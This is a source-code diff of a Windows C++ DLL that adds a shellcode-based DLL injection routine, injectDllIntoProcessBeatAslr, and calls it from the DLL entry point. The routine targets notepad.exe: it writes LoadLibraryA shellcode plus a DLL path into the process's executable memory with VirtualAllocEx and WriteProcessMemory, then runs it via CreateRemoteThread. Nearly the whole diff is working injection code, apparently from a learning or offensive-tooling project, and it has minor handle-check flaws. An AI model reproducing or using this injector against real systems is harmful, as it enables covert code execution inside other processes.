@@ -20,8 +20,6 @@
 
 #include <peutils.h>
 
-typedef unsigned __int64 QWORD;
-
 // forward declarations
 #if _WIN64
     extern "C" void __fastcall shLoadLibraryA(void);
@@ -32,17 +30,20 @@ typedef unsigned __int64 QWORD;
 PCSTR getDllPath();
 void testShellcodeInLocalProcess(PCSTR dllPath);
 void injectDllIntoProcess(PCSTR dllPath, PCSTR processName);
+void injectDllIntoProcessBeatAslr(PCSTR dllPath, PCSTR processName);
 
 BOOL WINAPI EntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
     LOG("hInstance: 0x%p, dwReason: 0x%p, lpReserved: 0x%p", hinstDLL, fdwReason, lpReserved);
 
     __try {
-        peutils::listTEBLoadedDlls();
+        //peutils::listTEBLoadedDlls();
 
-        testShellcodeInLocalProcess(getDllPath());
+        //testShellcodeInLocalProcess(getDllPath());
 
-        injectDllIntoProcess(getDllPath(), "notepad.exe");
+        //injectDllIntoProcess(getDllPath(), "notepad.exe");
+
+        injectDllIntoProcessBeatAslr(getDllPath(), "notepad.exe");
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         LOG("SEH exception occurred");
@@ -134,15 +135,15 @@ void testShellcodeInLocalProcess(PCSTR dllPath) {
     if (!pMem)
         return;
 
-    // for the following to work the shellcode must be null-free!
+    // For the following to work the shellcode must be null-free!
     strncpy(pMem, pShellcodeStr, shellcodeLen);
     strncpy(pMem + shellcodeLen, dllPath, dllPathLen);
     size_t fullLen = strlen(pMem);
     LOG("Payload full length is: %d", fullLen);
 
     DWORD dwOldPermissions = 0;
-    BOOL bRes = VirtualProtect(pMem, memLen, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
-    LOG("VirtualProtect(PAGE_EXECUTE_READWRITE) returned: %d", bRes);
+    BOOL bRes = VirtualProtectEx(GetCurrentProcess(), pMem, memLen, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
+    LOG("VirtualProtectEx(PAGE_EXECUTE_READWRITE) returned: %d", bRes);
 
     typedef void(__stdcall* shellcode_t)();
     shellcode_t pShellcode = reinterpret_cast<shellcode_t>(pMem);
@@ -205,7 +206,7 @@ void injectDllIntoProcess(PCSTR dllPath, PCSTR processName) {
     if (!pDllName)
         return;
 
-    // Finding LoadLibraryAddr
+    // Finding LoadLibraryA address
     SetLastError(0);
     LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
     LOG("GetProcAddress(LoadLibraryA) returned 0x%08x, GetLastError(): %d", pLoadLibrary, ulLastError);
@@ -227,4 +228,88 @@ void injectDllIntoProcess(PCSTR dllPath, PCSTR processName) {
     LOG("CreateRemoteThread(phandle: 0x%08x) returned 0x%08x, GetLastError(): %d", hProcess, hThread, ulLastError);
 
     CloseHandle(hProcess);
+}
+
+//
+// injectDllIntoProcessBeatAslr
+//     Performs the OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread injection approach.
+//     Appends the given dllPath to the end of the LoadLibraryA shellcode, writes it to the virtual memory
+//     of the given process, and creates a remote execution thread there, starting from the base address
+//     of this memory region.
+//     Assumes that the shellcode is null-free.
+//
+// Parameters:
+//     dllPath - the full path to the DLL image on the file system.
+//     processName - the name of the process to inject DLL into.
+//
+void injectDllIntoProcessBeatAslr(PCSTR dllPath, PCSTR processName) {
+    SetLastError(0);
+    ULONG ulLastError = GetLastError();
+
+    // Prepare shellcode by appending the dllPath to it
+    PSTR pShellcodeStr = reinterpret_cast<char*>(shLoadLibraryA);
+    size_t shellcodeLen = strlen(pShellcodeStr);
+    LOG("Shellcode string length is: %d", shellcodeLen);
+
+    size_t dllPathLen = strlen(dllPath);
+    LOG("Full path to dll is: %s", dllPath);
+
+    HMODULE pImageBaseBefore = GetModuleHandleA(dllPath);
+
+    size_t memLen = shellcodeLen + dllPathLen + 1;
+    PSTR pMem = new char[memLen];
+    memset(pMem, 0, memLen);
+    if (!pMem)
+        return;
+
+    // For the following to work the shellcode must be null-free!
+    strncpy(pMem, pShellcodeStr, shellcodeLen);
+    strncpy(pMem + shellcodeLen, dllPath, dllPathLen);
+    LOG("Shellcode full length is: %d", strlen(pMem));
+
+    // Get the process id by the given process name
+    DWORD pid = getPidByModuleName(processName);
+    LOG("getPidByModuleName(%s) returned %d", processName, pid);
+    if (pid == -1) {
+        delete[] pMem;
+        return;
+    }
+
+    // Get process handle
+    SetLastError(0);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LOG("OpenProcess(%d) returned 0x%08x", pid, hProcess);
+    if (hProcess == INVALID_HANDLE_VALUE) {
+        delete[] pMem;
+        return;
+    }
+
+    SetLastError(0);
+    LPVOID pBuffer = (LPVOID)VirtualAllocEx(hProcess, NULL, memLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    ulLastError = GetLastError();
+    LOG("VirtualAllocEx(phandle: 0x%08x, size: %d) returned 0x%08x, GetLastError(): %d", hProcess, memLen, pBuffer, ulLastError);
+    if (!pBuffer) {
+        delete[] pMem;
+        return;
+    }
+
+    // Write to memory
+    SetLastError(0);
+    BOOL bRes = WriteProcessMemory(hProcess, pBuffer, pMem, memLen, NULL);
+    ulLastError = GetLastError();
+    LOG("WriteProcessMemory(phandle: 0x%08x) returned %d, GetLastError(): %d", hProcess, bRes, ulLastError);
+    if (!bRes) {
+        delete[] pMem;
+        return;
+    }
+
+    // Create a thread inside virtual address space of the process
+    SetLastError(0);
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pBuffer, NULL, NULL, NULL);
+    ulLastError = GetLastError();
+    LOG("CreateRemoteThread(phandle: 0x%08x) returned 0x%08x, GetLastError(): %d", hProcess, hThread, ulLastError);
+
+    CloseHandle(hProcess);
+
+    delete[] pMem;
 }
